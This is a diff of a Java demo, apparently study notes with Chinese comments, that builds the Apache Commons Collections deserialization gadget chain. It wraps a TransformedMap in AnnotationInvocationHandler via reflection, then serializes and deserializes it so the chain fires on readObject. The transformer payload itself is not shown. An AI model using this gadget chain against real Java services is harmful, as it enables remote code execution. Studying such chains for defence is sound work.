@@ -1,3 +1,5 @@
+package demo.TransformedMap;
+
 import org.apache.commons.collections.Transformer;
 import org.apache.commons.collections.functors.ChainedTransformer;
 import org.apache.commons.collections.functors.ConstantTransformer;
@@ -8,11 +10,12 @@ import java.io.FileInputStream;
 import java.io.FileOutputStream;
 import java.io.ObjectInputStream;
 import java.io.ObjectOutputStream;
+import java.lang.annotation.Target;
+import java.lang.reflect.Constructor;
 import java.util.HashMap;
 import java.util.Map;
 
-
-public class Demo6 {
+public class Demo7 {
     public static void main(String[] args) throws Exception{
 
         Transformer[] transformers = {
@@ -23,23 +26,27 @@ public class Demo6 {
         };
         Transformer chain = new ChainedTransformer(transformers);
         Map innerMap = new HashMap();
-        //another way, must used "put" first then u can use entrySet().iterator().next()
-        //innerMap.put("foo", "bar");
+//        innerMap.put("foo","bar");//不行，key要为value
+        innerMap.put("value","bar");
         Map outerMap = TransformedMap.decorate(innerMap, null, chain);
+        //反射机制调用AnnotationInvocationHandler类的构造函数
+        Class cl = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
+        Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);
+        //访问权限放开，private之类的也能调用
+        ctor.setAccessible(true);
+        //获取AnnotationInvocationHandler类实例
+        Object instance = ctor.newInstance(Target.class ,outerMap);
+
+
         //序列化
         FileOutputStream file = new FileOutputStream("chenlvtang.bin");
         ObjectOutputStream se = new ObjectOutputStream(file);
-        se.writeObject(outerMap);
+        se.writeObject(instance);
         se.close();
         //反序列化
         FileInputStream file1 = new FileInputStream("chenlvtang.bin");
         ObjectInputStream unse = new ObjectInputStream(file1);
-        Map outerMap_now =  (Map)unse.readObject();
+        unse.readObject();
         unse.close();
-
-        outerMap_now.put("x","y");
-        //another way
-        //Map.Entry onlyElement = (Map.Entry) outerMap_now.entrySet().iterator().next();
-        //onlyElement.setValue("foobar");
     }
 }
